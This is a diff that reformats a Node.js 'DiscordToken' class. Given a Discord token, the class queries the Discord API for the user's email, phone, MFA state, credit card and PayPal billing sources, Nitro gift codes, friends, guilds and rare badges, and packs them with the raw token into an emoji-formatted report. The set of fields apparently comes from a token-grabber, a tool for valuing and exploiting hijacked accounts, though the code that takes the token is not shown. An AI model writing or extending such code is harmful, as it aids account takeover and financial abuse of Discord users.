@@ -4,47 +4,21 @@ const request = require("sync-request");
 module.exports = class DiscordToken { 
   constructor(token) {
     const user = this.getDiscordApi("https://discord.com/api/v9/users/@me", token);
-    const profile = this.getDiscordApi(
-      `https://discord.com/api/v9/users/${Buffer.from(
-        token.split(".")[0],
-        "base64",
-      ).toString()}/profile`,
-      token,
-    );
-    const settings = this.getDiscordApi(
-      "https://discord.com/api/v9/users/@me/settings",
-      token,
-    );
-    const paymentSources = this.getDiscordApi(
-      "https://discord.com/api/v9/users/@me/billing/payment-sources",
-      token,
-    );
-    const relationships = this.getDiscordApi(
-      "https://discordapp.com/api/v9/users/@me/relationships",
-      token,
-    );
-    const guilds = this.getDiscordApi(
-      "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
-      token,
-    );
-    const applications = this.getDiscordApi(
-      "https://discord.com/api/v9/applications",
-      token,
-    );
-    const connections = this.getDiscordApi(
-      "https://discordapp.com/api/v9/users/@me/connections",
-      token,
-    );
-    const entitlements = this.getDiscordApi(
-      "https://discord.com/api/v8/users/@me/entitlements/gifts",
-      token,
-    );
+    const profile = this.getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0],"base64").toString("binary")}/profile`, token);
     if (!user || user === "Invalid") {
-      this.info = {"message":"Token not found"};
-      this.guilds = {"message":"Token not found"};
-      this.friends = {"message":"Token not found"};
+      this.info = {message:"Token not found"};
+      this.guilds = {message:"Token not found"};
+      this.friends = {message:"Token not found"};
       return;
     }
+    const settings = this.getDiscordApi("https://discord.com/api/v9/users/@me/settings", token);
+    const paymentSources = this.getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token);
+    const relationships = this.getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token);
+    const guilds = this.getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token);
+    const applications = this.getDiscordApi("https://discord.com/api/v9/applications", token);
+    const connections = this.getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token);
+    const entitlements = this.getDiscordApi( "https://discord.com/api/v8/users/@me/entitlements/gifts", token);
+    
     let creditCard = false;
     let paypal = false;
     paymentSources?.forEach((source) => {
@@ -56,18 +30,18 @@ module.exports = class DiscordToken {
       }
     });
     this.emojis = {
-      "themes":{
-        "dark": "Dark",
-        "light": "Light",  
+      themes:{
+        dark: "Dark",
+        light: "Light",  
       },
-      "status": {
-        "online": "<:online:1129709364316491787>",
-        "idle": "<:idle:1120542710424674306>",
-        "dnd": "<:dnd:974692691289993216>",
-        "invisible": "<:offline:1137141023529762916>",  
+      status: {
+        online: "<:online:1129709364316491787>",
+        idle: "<:idle:1120542710424674306>",
+        dnd: "<:dnd:974692691289993216>",
+        invisible: "<:offline:1137141023529762916>",  
       },
-      "user": {
-        "boost": [
+      user: {
+        boost: [
           "<:Booster1Month:1087043238654906472> ",
           "<:Booster2Month:1087043319227494460> ",
           "<:Booster3Month:1087043368250511512> ",
@@ -78,11 +52,11 @@ module.exports = class DiscordToken {
           "<:Booster18Month:1051453778127237180> ",
           "<:Booster24Month:1051453776889917530> ",
         ],
-        "payments": [
+        payments: [
           "<a:card:1083014677430284358> ",
           "<:paypal:1129073151746252870> " 
         ],
-        "i": [
+        i: [
           "<:staff:1090015968618623129> ",
           "<:partner:918207395279273985> ",
           "<:events:898186057588277259> ",
@@ -101,61 +75,41 @@ module.exports = class DiscordToken {
     this.paymentSources = creditCard ? this.emojis.user.payments[0] : "";
     this.paymentSources += paypal ? this.emojis.user.payments[1] : "None";
     this.info = {
-      "token": token,
-      "ID": user.id,
-      "globalName": `${user.global_name}`,
-      "avatarDecoration": `${user.avatar_decoration_data ? user.avatar_decoration_data: "None"}`,
-      "username": `${user.username}#${user.discriminator}`,
-      "badges": this.AllBadges(user.flags),
-      "nitroType": this.getNitroPremium(profile),
-      "avatar": user.avatar
-        ? this.getImage(
-            `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`,
-          )
-        : "has no avatar",
-      "banner": user.banner
-      ? this.getImage(
-          `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`,
-        )
-      : "has no banner",
-      "totalFriend": relationships.filter((relation) => relation.type === 1)
-        .length,
-      "totalBlocked": relationships.filter((relation) => relation.type === 2)
-        .length,
-      "pending": relationships.filter((relation) => relation.type === 3)
-        .length,
-      "NitroGifts": entitlements[0]
-        ? entitlements.map((gift) => `${gift}, `).join("")
-        : "None",
-      "totalOwnedGuild": guilds.filter((guild) => guild.owner)
-        .length,
-      "totalApplication": applications.length,
-      "totalConnection": connections.length,
-      "totalGuild": guilds.length,
-      "NSFW": user.nsfw_allowed 
-        ? "🔞 `Allowed`" 
-        : "❌ `Not allowed`",
-      "MFA2": user.mfa_enabled
-        ? "✅ `Allowed`" 
-        : "❌ `Not allowed`",
-      "verified": user.verified
-        ? "✅" 
-        : "❌",
-      "bio": user.bio || "has no description",
-      "phone": user.phone || "has no phone",
-      "mail": user.email,
-      "billing": this.paymentSources,
-      "langue": this.getLanguage(settings.locale),
-      "status": this.getStatusEmoji(settings.status),
-      "theme": this.getTheme(settings.theme),  
-      "Gifts": this.getGiftsCodes(token, settings),
-      "StrangeFriends": this.rareFriend(relationships),
+      token: token,
+      ID: user.id,
+      globalName: `${user.global_name}`,
+      avatarDecoration: `${user.avatar_decoration_data ? user.avatar_decoration_data: "None"}`,
+      username: `${user.username}#${user.discriminator}`,
+      badges: this.AllBadges(user.flags),
+      nitroType: this.getNitroPremium(profile),
+      avatar: user.avatar ? this.getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`): "has no avatar",
+      banner: user.banner ? this.getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`): "has no banner",
+      totalFriend: relationships.filter((relation) => relation.type === 1).length,
+      totalBlocked: relationships.filter((relation) => relation.type === 2).length,
+      pending: relationships.filter((relation) => relation.type === 3).length,
+      NitroGifts: entitlements[0] ? entitlements.map((gift) => `${gift}, `).join("") : "None",
+      totalOwnedGuild: guilds.filter((guild) => guild.owner).length,
+      totalApplication: applications.length,
+      totalConnection: connections.length,
+      totalGuild: guilds.length,
+      NSFW: user.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
+      MFA2: user.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
+      verified: user.verified ? "✅" : "❌",
+      bio: user.bio || "has no description",
+      phone: user.phone || "has no phone",
+      mail: user.email,
+      billing: this.paymentSources,
+      langue: this.getLanguage(settings.locale),
+      status: this.getStatusEmoji(settings.status),
+      theme: this.getTheme(settings.theme),  
+      Gifts: this.getGiftsCodes(token, settings),
+      StrangeFriends: this.rareFriend(relationships),
     };
     this.guilds = {
-      "rares": this.getGuilds(guilds).rare
+      rares: this.getGuilds(guilds).rare
     };
     this.friends = {
-      "rares": this.rareFriend(relationships)
+      rares: this.rareFriend(relationships)
     }
   }
   getGuilds(n){
@@ -335,9 +289,9 @@ module.exports = class DiscordToken {
         return `<:nitro:1016385399020601344> ${this.emojis.user.boost[remainingBoosts]}`;
     }
   }
-  getDate(startDate, months) {
-    const endDate = new Date(startDate);
-    endDate.setMonth(startDate.getMonth() + months);
-    return endDate;
+  getDate(s, m) {
+    const e = new Date(s);
+    e.setMonth(s.getMonth() + m);
+    return e;
   }
 }
